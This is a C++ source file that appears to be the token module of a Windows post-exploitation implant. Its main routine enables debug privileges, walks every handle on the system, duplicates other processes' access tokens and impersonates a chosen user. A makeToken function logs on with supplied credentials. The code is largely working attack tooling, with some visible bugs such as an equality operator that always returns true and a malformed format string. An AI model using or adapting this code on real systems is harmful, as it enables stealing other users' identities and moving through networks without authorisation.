#include <windows.h>
#include <sddl.h>
#include <security.h>
#include <secext.h>
#include "Token.h"
#include <atomic>
#include <vector>
#include <format>
#include <iostream>
using namespace std;

namespace token {
    HANDLE current_token = INVALID_HANDLE_VALUE;

    HANDLE getToken() {
        return current_token;
    }

    void get_token_SessionId(TOKEN* TOKEN_INFO) {
        DWORD token_info, SessionId;
        if (!GetTokenInformation(TOKEN_INFO->TokenHandle, TokenSessionId, NULL, 0, &token_info)) {
            PTOKEN_OWNER TokenStatisticsInformation = (PTOKEN_OWNER)GlobalAlloc(GPTR, token_info);
            if (GetTokenInformation(TOKEN_INFO->TokenHandle, TokenSessionId, &SessionId, token_info, &token_info)) {
                TOKEN_INFO->SessionId = SessionId;
            }
            GlobalFree(TokenStatisticsInformation);
        }
    }
    Token::Token(const Token& other) {
        this->TokenHandle = other.TokenHandle;
        this->TokenId = other.TokenId;
        this->TokenType = other.TokenType;
        this->TokenImpLevel = other.TokenImpLevel;
        this->TokenIntegrity = other.TokenIntegrity;
        this->Username = other.Username;
    }
    Token::Token(HANDLE hToken) : TokenHandle(hToken){
        //get token user info
        if (hToken == 0 || hToken == INVALID_HANDLE_VALUE)
            return;
        wchar_t username[MAX_USERNAME_LENGTH], domain[MAX_DOMAINNAME_LENGTH];
        SID_NAME_USE sid;
        DWORD token_info = 0, user_length = MAX_USERNAME_LENGTH, domain_length = MAX_DOMAINNAME_LENGTH;
        if (!GetTokenInformation(TokenHandle, TokenUser, NULL, 0, &token_info)) {
            PTOKEN_USER TokenStatisticsInformation = (PTOKEN_USER)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,token_info);
            if (GetTokenInformation(TokenHandle, TokenUser, TokenStatisticsInformation, token_info, &token_info)) {
                LookupAccountSidW(NULL, ((TOKEN_USER*)TokenStatisticsInformation)->User.Sid, username, &user_length, domain, &domain_length, &sid);
                this->Username.resize(domain_length + user_length + 2);
                this->Username = domain;
                this->Username.append(L"/").append(username);
            }
            auto res = HeapFree(GetProcessHeap(), 0, TokenStatisticsInformation);
        }
        // get_token_information
        DWORD returned_tokinfo_length;
        if (!GetTokenInformation(TokenHandle, TokenStatistics, NULL, 0, &returned_tokinfo_length)) {
            PTOKEN_STATISTICS TokenStatisticsInformation = (PTOKEN_STATISTICS)HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY, returned_tokinfo_length);
            if (GetTokenInformation(TokenHandle, TokenStatistics, TokenStatisticsInformation, returned_tokinfo_length, &returned_tokinfo_length)) {
                if (TokenStatisticsInformation->TokenType == TokenPrimary) {
                    this->TokenType = L"TokenPrimary";
                    //wcscpy_s(TOKEN_INFO->TokenType, TOKEN_TYPE_LENGTH, L"TokenPrimary");
                    DWORD cbSize;
                    if (!GetTokenInformation(TokenHandle, TokenIntegrityLevel, NULL, 0, &cbSize)) {
                        PTOKEN_MANDATORY_LABEL TokenStatisticsInformation_integrity = (PTOKEN_MANDATORY_LABEL)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cbSize);
                        if (GetTokenInformation(TokenHandle, TokenIntegrityLevel, TokenStatisticsInformation_integrity, cbSize, &cbSize)) {
                            DWORD dwIntegrityLevel = *GetSidSubAuthority(TokenStatisticsInformation_integrity->Label.Sid, (DWORD)(UCHAR)(*GetSidSubAuthorityCount(TokenStatisticsInformation_integrity->Label.Sid) - 1));
                            if (dwIntegrityLevel == SECURITY_MANDATORY_LOW_RID) {
                                this->TokenIntegrity = L"Low";
                                //wcscpy_s(TOKEN_INFO->TokenIntegrity, TOKEN_INTEGRITY_LENGTH, L"Low");
                            }
                            else if (dwIntegrityLevel >= SECURITY_MANDATORY_MEDIUM_RID && dwIntegrityLevel < SECURITY_MANDATORY_HIGH_RID) {
                                this->TokenIntegrity = L"Medium";
                                //wcscpy_s(TOKEN_INFO->TokenIntegrity, TOKEN_INTEGRITY_LENGTH, L"Medium");
                            }
                            else if (dwIntegrityLevel >= SECURITY_MANDATORY_HIGH_RID) {
                                this->TokenIntegrity = L"High";
                                //wcscpy_s(TOKEN_INFO->TokenIntegrity, TOKEN_INTEGRITY_LENGTH, L"High");
                            }
                            else if (dwIntegrityLevel >= SECURITY_MANDATORY_SYSTEM_RID) {
                                this->TokenIntegrity = L"System";
                                //wcscpy_s(TOKEN_INFO->TokenIntegrity, TOKEN_INTEGRITY_LENGTH, L"System");
                            }
                        }
                        auto res = HeapFree(GetProcessHeap(), 0, TokenStatisticsInformation_integrity);
                    }
                }
                else if (TokenStatisticsInformation->TokenType == TokenImpersonation) {
                    TokenType = L"TokenImpersonation";
                    //deleted Token type cpy
                    TokenIntegrity = L" ";
                    //wcscpy_s(TOKEN_INFO->TokenIntegrity, 100, L" ");
                    DWORD returned_tokimp_length = 0;
                    if (!GetTokenInformation(TokenHandle, TokenImpersonationLevel, NULL, 0, &returned_tokimp_length)) {
                        PSECURITY_IMPERSONATION_LEVEL TokenImpersonationInformation = (PSECURITY_IMPERSONATION_LEVEL)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, returned_tokimp_length);
                        if (GetTokenInformation(TokenHandle, TokenImpersonationLevel, TokenImpersonationInformation, returned_tokimp_length, &returned_tokimp_length)) {
                            if (*((SECURITY_IMPERSONATION_LEVEL*)TokenImpersonationInformation) == SecurityImpersonation) {
                                TokenImpLevel = L"SecurityImpersonation";
                                //wcscpy_s(TOKEN_INFO->TokenImpersonationLevel, TOKEN_IMPERSONATION_LENGTH, L"SecurityImpersonation");
                            }
                            else if (*((SECURITY_IMPERSONATION_LEVEL*)TokenImpersonationInformation) == SecurityDelegation) {
                                TokenImpLevel = L"SecurityDelegation";
                                //wcscpy_s(TOKEN_INFO->TokenImpersonationLevel, TOKEN_IMPERSONATION_LENGTH, L"SecurityDelegation");
                            }
                            else if (*((SECURITY_IMPERSONATION_LEVEL*)TokenImpersonationInformation) == SecurityAnonymous) {
                                TokenImpLevel = L"SecurityAnonymous";
                                //wcscpy_s(TOKEN_INFO->TokenImpersonationLevel, TOKEN_IMPERSONATION_LENGTH, L"SecurityAnonymous");
                            }
                            else if (*((SECURITY_IMPERSONATION_LEVEL*)TokenImpersonationInformation) == SecurityIdentification) {
                                TokenImpLevel = L"SecurityIdentification";
                                //wcscpy_s(TOKEN_INFO->TokenImpersonationLevel, TOKEN_IMPERSONATION_LENGTH, L"SecurityIdentification");
                            }
                        }
                        HeapFree(GetProcessHeap(), 0, TokenImpersonationInformation);
                    }
                }
            }
            HeapFree(GetProcessHeap(), 0, TokenStatisticsInformation);
        }
    }

    bool Token::operator==(const Token& tk) {
        return true;
    }
    void get_token_user_info(TOKEN* TOKEN_INFO) {
        wchar_t username[MAX_USERNAME_LENGTH], domain[MAX_DOMAINNAME_LENGTH], full_name[FULL_NAME_LENGTH];
        DWORD user_length = sizeof(username), domain_length = sizeof(domain), token_info;
        SID_NAME_USE sid;
        if (!GetTokenInformation(TOKEN_INFO->TokenHandle, TokenUser, NULL, 0, &token_info)) {
            PTOKEN_USER TokenStatisticsInformation = (PTOKEN_USER)GlobalAlloc(GPTR, token_info);
            if (GetTokenInformation(TOKEN_INFO->TokenHandle, TokenUser, TokenStatisticsInformation, token_info, &token_info)) {
                LookupAccountSidW(NULL, ((TOKEN_USER*)TokenStatisticsInformation)->User.Sid, username, &user_length, domain, &domain_length, &sid);
                _snwprintf_s(full_name, FULL_NAME_LENGTH, L"%ws/%ws", domain, username);
                wcscpy_s(TOKEN_INFO->Username, FULL_NAME_LENGTH, full_name);
            }
            GlobalFree(TokenStatisticsInformation);
        }
    }

    void get_token_information(TOKEN* TOKEN_INFO) {
        DWORD returned_tokinfo_length;
        if (!GetTokenInformation(TOKEN_INFO->TokenHandle, TokenStatistics, NULL, 0, &returned_tokinfo_length)) {
            PTOKEN_STATISTICS TokenStatisticsInformation = (PTOKEN_STATISTICS)GlobalAlloc(GPTR, returned_tokinfo_length);
            if (GetTokenInformation(TOKEN_INFO->TokenHandle, TokenStatistics, TokenStatisticsInformation, returned_tokinfo_length, &returned_tokinfo_length)) {
                if (TokenStatisticsInformation->TokenType == TokenPrimary) {
                    wcscpy_s(TOKEN_INFO->TokenType, TOKEN_TYPE_LENGTH, L"TokenPrimary");
                    DWORD cbSize;
                    if (!GetTokenInformation(TOKEN_INFO->TokenHandle, TokenIntegrityLevel, NULL, 0, &cbSize)) {
                        PTOKEN_MANDATORY_LABEL TokenStatisticsInformation_integrity = (PTOKEN_MANDATORY_LABEL)GlobalAlloc(GPTR, cbSize);
                        if (GetTokenInformation(TOKEN_INFO->TokenHandle, TokenIntegrityLevel, TokenStatisticsInformation_integrity, cbSize, &cbSize)) {
                            DWORD dwIntegrityLevel = *GetSidSubAuthority(TokenStatisticsInformation_integrity->Label.Sid, (DWORD)(UCHAR)(*GetSidSubAuthorityCount(TokenStatisticsInformation_integrity->Label.Sid) - 1));
                            if (dwIntegrityLevel == SECURITY_MANDATORY_LOW_RID) {
                                wcscpy_s(TOKEN_INFO->TokenIntegrity, TOKEN_INTEGRITY_LENGTH, L"Low");
                            }
                            else if (dwIntegrityLevel >= SECURITY_MANDATORY_MEDIUM_RID && dwIntegrityLevel < SECURITY_MANDATORY_HIGH_RID) {
                                wcscpy_s(TOKEN_INFO->TokenIntegrity, TOKEN_INTEGRITY_LENGTH, L"Medium");
                            }
                            else if (dwIntegrityLevel >= SECURITY_MANDATORY_HIGH_RID) {
                                wcscpy_s(TOKEN_INFO->TokenIntegrity, TOKEN_INTEGRITY_LENGTH, L"High");
                            }
                            else if (dwIntegrityLevel >= SECURITY_MANDATORY_SYSTEM_RID) {
                                wcscpy_s(TOKEN_INFO->TokenIntegrity, TOKEN_INTEGRITY_LENGTH, L"System");
                            }
                        }
                        GlobalFree(TokenStatisticsInformation_integrity);
                    }
                }
                else if (TokenStatisticsInformation->TokenType == TokenImpersonation) {
                    wcscpy_s(TOKEN_INFO->TokenType, TOKEN_TYPE_LENGTH, L"TokenImpersonation");
                    wcscpy_s(TOKEN_INFO->TokenIntegrity, 100, L" ");
                    DWORD returned_tokimp_length;
                    if (!GetTokenInformation(TOKEN_INFO->TokenHandle, TokenImpersonationLevel, NULL, 0, &returned_tokimp_length)) {
                        PSECURITY_IMPERSONATION_LEVEL TokenImpersonationInformation = (PSECURITY_IMPERSONATION_LEVEL)GlobalAlloc(GPTR, returned_tokimp_length);
                        if (GetTokenInformation(TOKEN_INFO->TokenHandle, TokenImpersonationLevel, TokenImpersonationInformation, returned_tokimp_length, &returned_tokimp_length)) {
                            if (*((SECURITY_IMPERSONATION_LEVEL*)TokenImpersonationInformation) == SecurityImpersonation) {
                                wcscpy_s(TOKEN_INFO->TokenImpersonationLevel, TOKEN_IMPERSONATION_LENGTH, L"SecurityImpersonation");
                            }
                            else if (*((SECURITY_IMPERSONATION_LEVEL*)TokenImpersonationInformation) == SecurityDelegation) {
                                wcscpy_s(TOKEN_INFO->TokenImpersonationLevel, TOKEN_IMPERSONATION_LENGTH, L"SecurityDelegation");
                            }
                            else if (*((SECURITY_IMPERSONATION_LEVEL*)TokenImpersonationInformation) == SecurityAnonymous) {
                                wcscpy_s(TOKEN_INFO->TokenImpersonationLevel, TOKEN_IMPERSONATION_LENGTH, L"SecurityAnonymous");
                            }
                            else if (*((SECURITY_IMPERSONATION_LEVEL*)TokenImpersonationInformation) == SecurityIdentification) {
                                wcscpy_s(TOKEN_INFO->TokenImpersonationLevel, TOKEN_IMPERSONATION_LENGTH, L"SecurityIdentification");
                            }
                        }
                        GlobalFree(TokenImpersonationInformation);
                    }
                }
            }
            GlobalFree(TokenStatisticsInformation);
        }
    }

    std::wstring GetObjectInfo(HANDLE hObject, OBJECT_INFORMATION_CLASS objInfoClass) {
        //LPWSTR data = NULL;
        std::wstring data;
        DWORD dwSize = sizeof(OBJECT_NAME_INFORMATION);
        POBJECT_NAME_INFORMATION pObjectInfo = (POBJECT_NAME_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,dwSize);

        NTSTATUS ntReturn = NtQueryObject(hObject, objInfoClass, pObjectInfo, dwSize, &dwSize);
        if ((ntReturn == STATUS_BUFFER_OVERFLOW) || (ntReturn == STATUS_INFO_LENGTH_MISMATCH)) {
            pObjectInfo = (POBJECT_NAME_INFORMATION)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, pObjectInfo, dwSize);
            //pObjectInfo = (POBJECT_NAME_INFORMATION)realloc(pObjectInfo, dwSize);
            ntReturn = NtQueryObject(hObject, objInfoClass, pObjectInfo, dwSize, &dwSize);
        }
        if ((ntReturn >= STATUS_SUCCESS) && (pObjectInfo->Buffer != NULL)) {
            data = pObjectInfo->Buffer;
        }
        HeapFree(GetProcessHeap(),0,pObjectInfo);
        return data;
    }
    bool Impersonate(const std::string& username) {
        HANDLE hToken;
        DWORD cbSize;
        std::wstring wsusername(username.size(), L' '); // Overestimate number of code points.
        wsusername.resize(std::mbstowcs(&wsusername[0], username.c_str(), username.size())); // Shrink to fit.

        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
        OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
        GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &cbSize);
        PTOKEN_MANDATORY_LABEL pTIL = (PTOKEN_MANDATORY_LABEL)HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY, cbSize);
        GetTokenInformation(hToken, TokenIntegrityLevel, pTIL, cbSize, &cbSize);
        DWORD current_process_integrity = (DWORD)*GetSidSubAuthority(pTIL->Label.Sid, (DWORD)(UCHAR)(*GetSidSubAuthorityCount(pTIL->Label.Sid) - 1));

        TOKEN_PRIVILEGES tp;
        LUID luidSeAssignPrimaryTokenPrivilege;
        printf("[?] Enabling SeAssignPrimaryToken\n");
        if (LookupPrivilegeValue(NULL, SE_ASSIGNPRIMARYTOKEN_NAME, &luidSeAssignPrimaryTokenPrivilege) == 0) {
            printf("\t[!] SeAssignPrimaryToken not owned!\n");
        }
        else {
            printf("\t[*] SeAssignPrimaryToken owned!\n");
        }
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luidSeAssignPrimaryTokenPrivilege;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        if (AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL) == 0) {
            printf("\t[!] SeAssignPrimaryToken adjust token failed: %d\n", GetLastError());
        }
        else {
            printf("\t[*] SeAssignPrimaryToken enabled!\n");
        }
    
        LUID luidSeDebugPrivivilege;
        printf("[?] Enabling SeDebugPrivilege\n");
        if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luidSeDebugPrivivilege) == 0) {
            printf("\t[!] SeDebugPrivilege not owned!\n");
        }
        else {
            printf("\t[*] SeDebugPrivilege owned!\n");
        }
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luidSeDebugPrivivilege;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        if (AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL) == 0) {
            printf("\t[!] SeDebugPrivilege adjust token failed: %d\n", GetLastError());
        }
        else {
            printf("\t[*] SeDebugPrivilege enabled!\n");
        }
        CloseHandle(hProcess);
        CloseHandle(hToken);
        auto res = HeapFree(GetProcessHeap(), 0, pTIL);
        DWORD current_SessionId;
        ProcessIdToSessionId(GetCurrentProcessId(), &current_SessionId);
        ULONG returnLenght = 0;
        std::vector<Token> vec;
        int nbrsfoundtokens = 0;
        fNtQuerySystemInformation NtQuerySystemInformation = (fNtQuerySystemInformation)GetProcAddress(GetModuleHandleW(L"ntdll"), "NtQuerySystemInformation");
        PSYSTEM_HANDLE_INFORMATION handleTableInformation = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, SystemHandleInformationSize);
        NtQuerySystemInformation(SystemHandleInformation, handleTableInformation, SystemHandleInformationSize, &returnLenght);
        for (DWORD i = 0; i < handleTableInformation->NumberOfHandles; i++) {
            SYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = (SYSTEM_HANDLE_TABLE_ENTRY_INFO)handleTableInformation->Handles[i];

            HANDLE process = OpenProcess(PROCESS_DUP_HANDLE, FALSE, handleInfo.ProcessId);
            if (process == INVALID_HANDLE_VALUE || process == 0x0) {
                CloseHandle(process);
                continue;
            }

            HANDLE dupHandle;
            if (DuplicateHandle(process, (HANDLE)handleInfo.HandleValue, GetCurrentProcess(), &dupHandle, 0, FALSE, DUPLICATE_SAME_ACCESS) == 0) {
                CloseHandle(process);
                continue;
            }
            /*auto bytes = new std::byte[8192];
            POBJECT_TYPE_INFORMATION objectTypeInfo = (POBJECT_TYPE_INFORMATION)&bytes[0];*/
            if (wcscmp(GetObjectInfo(dupHandle, ObjectTypeInformation).c_str(), L"Token")) {
                CloseHandle(process);
                CloseHandle(dupHandle);
   //             delete[] bytes;
                continue;
            }

            Token tk{ dupHandle };
            /*TOKEN_INFO.TokenHandle = dupHandle;
            get_token_user_info(&TOKEN_INFO);
            get_token_information(&TOKEN_INFO);
            get_token_SessionId(&TOKEN_INFO);*/

            vec.push_back(tk);
            /*int is_new_token = 0;
            for (int j = 0; j <= nbrsfoundtokens; j++) {
                if (wcscmp(found_tokens[j].Username, TOKEN_INFO.Username) == 0 && wcscmp(found_tokens[j].TokenType, TOKEN_INFO.TokenType) == 0 && wcscmp(found_tokens[j].TokenImpersonationLevel, TOKEN_INFO.TokenImpersonationLevel) == 0 && wcscmp(found_tokens[j].TokenIntegrity, TOKEN_INFO.TokenIntegrity) == 0) {
                    is_new_token = 1;
                }
            }

            if (is_new_token == 0) {
                TOKEN_INFO.TokenId = nbrsfoundtokens;
                found_tokens[nbrsfoundtokens] = TOKEN_INFO;
                nbrsfoundtokens += 1;
            }*/
            CloseHandle(process);
        }
        HeapFree(GetProcessHeap(), 0, handleTableInformation);
        std::cout << string{ "\n[*] Listing available tokens\n" } << std::endl;
        for (auto it = vec.begin();it != vec.end();++it) {
            std::wcout << std::format(L"[ID: {}][SESSION: {}][INTEGRITY: {}][%-{}][{}] User: {}", it->TokenId, it->SessionId, it->TokenIntegrity, it->TokenType, it->TokenImpLevel, it->Username) << std::endl;
            //printf("[ID: %2d][SESSION: %d][INTEGRITY: %-6ws][%-18ws][%-22ws] User: %ws\n", it->TokenId, it->SessionId, it->TokenIntegrity, it->TokenType, it->TokenImpLevel, it->Username);
        }
        for (auto it = vec.begin();it != vec.end();++it) {
            if (it->Username.compare(wsusername) == 0 &&
                (it->TokenImpLevel.compare(L"SecurityDelegation") == 0 || it->TokenImpLevel.compare(L"SecurityImpersonation") == 0)
                && (it->TokenIntegrity.compare(L"Medium") == 0 || it->TokenIntegrity.compare(L"High") == 0 || it->TokenIntegrity.compare(L"System") == 0)
                ) {
                HANDLE duplicated_token;
                if (DuplicateTokenEx(it->TokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityDelegation, TokenImpersonation, &duplicated_token) != 0) {
                    current_token = duplicated_token;
                    return true;
                }
            }
        }
        return false;
    }

    bool ListTokens() {
        return true;
    }

    bool Impersonate(const int pid) {
        /*HANDLE hToken = INVALID_HANDLE_VALUE, dupToken = INVALID_HANDLE_VALUE;
        HANDLE hProc = INVALID_HANDLE_VALUE;
        hProc = OpenProcess(PROCESS_DUP_HANDLE, FALSE, pid);
        if (hProc == INVALID_HANDLE_VALUE) {
            CloseHandle(hProc);
            return false;
        }
        HANDLE dupHandle;
        if (DuplicateHandle(hProc, (HANDLE)handleInfo.HandleValue, GetCurrentProcess(), &dupHandle, 0, FALSE, DUPLICATE_SAME_ACCESS) == 0) {
            CloseHandle(process);
            continue;
        }
        OpenProcessToken(hProc, TOKEN_QUERY , &hToken);
        if (hToken == INVALID_HANDLE_VALUE)
            return false;
        DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityDelegation, TokenImpersonation, &dupToken);
        if (dupToken == INVALID_HANDLE_VALUE)
            return false;
        current_token = dupToken;*/
        return true;
    }

    bool makeToken(const string& domain, const string& username, const string& password, uint32_t logonType) {
        if (logonType == 0) {
            logonType = LOGON32_LOGON_NEW_CREDENTIALS;
        }
        HANDLE token;
        auto res = LogonUserA(username.c_str(), domain.c_str(), password.c_str(), logonType, LOGON32_PROVIDER_DEFAULT, &token);
        if (res) {
            current_token = token;
        }
        return res;
    }
    bool revertToken() {
        current_token = INVALID_HANDLE_VALUE;
        return true;
    }

    string SidToString(PSID sid) {
        LPSTR sid_string;
        auto b = ConvertSidToStringSidA(sid, &sid_string);
        string str{ sid_string };
        auto a = LocalFree(sid_string);
        return str;
    }

    string GetUserNameString() {
        string a;
        ULONG size = 0;
        GetUserNameExA(NameSamCompatible, NULL, &size);
        a.resize(size);
        GetUserNameExA(NameSamCompatible, (LPSTR)a.c_str(), &size);
        return a;
    }
    UserInfo GetCurrentUserInfo() {
        HANDLE p = GetCurrentProcess();
        HANDLE t;
        OpenProcessToken(p, TOKEN_QUERY, &t);
        DWORD size = 0;
        auto res = GetTokenInformation(t, TokenUser, NULL, 0, &size);
        std::string tu;
        tu.resize(size);
        res = GetTokenInformation(t, TokenUser, (LPVOID)tu.c_str(), size, &size);
        res = GetTokenInformation(t, TokenPrimaryGroup, NULL, 0, &size);
        std::string tpg;
        tpg.resize(size);
        res = GetTokenInformation(t, TokenPrimaryGroup, (LPVOID)tpg.c_str(), size, &size);
        auto uid = SidToString(((PTOKEN_USER)(tu.c_str()))->User.Sid);
        auto gid = SidToString(((PTOKEN_PRIMARY_GROUP)(tpg.c_str()))->PrimaryGroup);
        auto username = GetUserNameString();
        return UserInfo{ uid = uid,gid = gid,username = username };
    }
}
